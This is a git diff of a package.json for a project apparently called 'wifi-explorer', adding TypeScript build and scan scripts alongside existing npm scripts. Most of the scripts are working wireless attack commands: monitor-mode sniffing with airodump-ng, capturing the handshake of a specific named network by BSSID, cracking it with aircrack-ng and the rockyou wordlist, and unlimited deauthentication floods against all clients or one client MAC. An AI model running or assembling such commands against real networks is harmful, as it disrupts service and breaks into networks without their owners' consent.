@@ -2,21 +2,34 @@
   "name": "wifi-explorer",
   "version": "1.0.0",
   "description": "collect some knowledge",
-  "main": "index.js",
+  "main": "dist/automate.js",
   "author": "neptuntriton <jens.haupt.eu@gmail.com>",
   "license": "MIT",
   "private": true,
   "scripts": {
-    "up": "sudo ip link set wlxc83a35ca40e1 up",
-    "down": "sudo ip link set wlxc83a35ca40e1 down",
-    "info": "iwconfig wlxc83a35ca40e1",
-    "managed" : "yarn down && sudo iw dev wlxc83a35ca40e1 set type managed && yarn up", 
-    "monitor" : "yarn down && sudo iw dev wlxc83a35ca40e1 set type monitor && yarn up",
-    "sniff" : "sudo airodump-ng wlxc83a35ca40e1",
-    "capture": "sudo airodump-ng --bssid D4:24:DD:16:15:AF -c 1 -w ./captures/capture-of-Kartoffel-01.cap wlxc83a35ca40e1",
+    "build": "tsc",
+    "scan": "yarn build && node dist/automate.js scan",
+    "scan:quick": "yarn build && node dist/automate.js scan 30",
+    "scan:long": "yarn build && node dist/automate.js scan 300",
+    "stats": "yarn build && node dist/automate.js stats",
+    "up": "sudo ip link set ${WIFI_INTERFACE:-wlxc83a35ca40e1} up",
+    "down": "sudo ip link set ${WIFI_INTERFACE:-wlxc83a35ca40e1} down",
+    "info": "iwconfig ${WIFI_INTERFACE:-wlxc83a35ca40e1}",
+    "managed": "yarn down && sudo iw dev ${WIFI_INTERFACE:-wlxc83a35ca40e1} set type managed && yarn up",
+    "monitor": "yarn down && sudo iw dev ${WIFI_INTERFACE:-wlxc83a35ca40e1} set type monitor && yarn up",
+    "sniff": "sudo airodump-ng ${WIFI_INTERFACE:-wlxc83a35ca40e1}",
+    "capture": "sudo airodump-ng --bssid D4:24:DD:16:15:AF -c 1 -w ./captures/capture-of-Kartoffel-01.cap ${WIFI_INTERFACE:-wlxc83a35ca40e1}",
     "verify": "sudo aircrack-ng ./captures/capture-of-Kartoffel-01.cap",
     "try-to-crack": "sudo aircrack-ng -w ./password-lists/rockyou.txt ./captures/capture-of-Kartoffel-01.cap",
-    "deauth-all": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF wlxc83a35ca40e1",
-    "deauth-client": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF -c 32:70:24:14:E3:92 wlxc83a35ca40e1"
+    "deauth-all": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF ${WIFI_INTERFACE:-wlxc83a35ca40e1}",
+    "deauth-client": "sudo aireplay-ng --deauth 0 -a D4:24:DD:16:15:AF -c 32:70:24:14:E3:92 ${WIFI_INTERFACE:-wlxc83a35ca40e1}"
+  },
+  "devDependencies": {
+    "@types/dotenv": "^6.1.1",
+    "@types/node": "^20.19.25",
+    "typescript": "^5.9.3"
+  },
+  "dependencies": {
+    "dotenv": "^17.2.3"
   }
 }
